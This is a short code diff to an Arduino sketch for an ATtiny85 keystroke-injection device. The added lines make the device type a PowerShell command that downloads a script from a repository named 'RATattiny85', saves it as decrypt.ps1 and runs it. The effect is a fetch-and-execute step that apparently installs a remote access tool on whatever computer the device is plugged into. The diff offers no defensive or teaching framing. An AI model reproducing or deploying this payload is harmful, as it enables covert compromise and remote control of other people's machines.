@@ -20,6 +20,12 @@ void loop() {
   DigiKeyboard.sendKeyStroke(4);
   DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.println(F("Invoke-WebRequest -Uri https://raw.githubusercontent.com/joyfulharbor/RATattiny85/main/run.txt -OutFile $HOME/decrypt.ps1"));
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println("cd $HOME");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("./decrypt.ps1");
+
   
 
   
